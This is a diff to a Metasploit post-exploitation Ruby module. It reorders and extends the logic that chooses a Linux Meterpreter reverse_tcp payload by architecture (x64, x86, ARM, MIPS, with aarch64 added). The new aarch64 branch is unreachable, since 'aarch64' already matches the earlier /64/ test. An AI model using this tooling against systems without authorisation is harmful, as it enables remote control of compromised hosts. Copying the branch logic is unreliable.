@@ -102,18 +102,21 @@ class MetasploitModule < Msf::Post
       if target_info =~ /linux/i
         platform = 'linux'
         lplat = [Msf::Platform::Linux]
-        if target_info =~ /86/
-          payload_name = 'linux/x86/meterpreter/reverse_tcp'
-          larch = [ARCH_X86]
-        elsif target_info =~ /64/
+        if target_info =~ /64/
           payload_name = 'linux/x64/meterpreter/reverse_tcp'
           larch = [ARCH_X64]
+        elsif target_info =~ /86/
+          payload_name = 'linux/x86/meterpreter/reverse_tcp'
+          larch = [ARCH_X86]
         elsif target_info =~ /arm/
           payload_name = 'linux/armle/meterpreter/reverse_tcp'
           larch = [ARCH_ARMLE]
         elsif target_info =~ /mips/
           payload_name = 'linux/mipsle/meterpreter/reverse_tcp'
           larch = [ARCH_MIPSLE]
+        elsif target_info =~ /aarch64/
+          payload_name = 'linux/aarch64/meterpreter/reverse_tcp'
+          larch = [ARCH_AARCH64]
         end
         vprint_status("ARCH = #{larch}")
       elsif target_info =~ /darwin/i
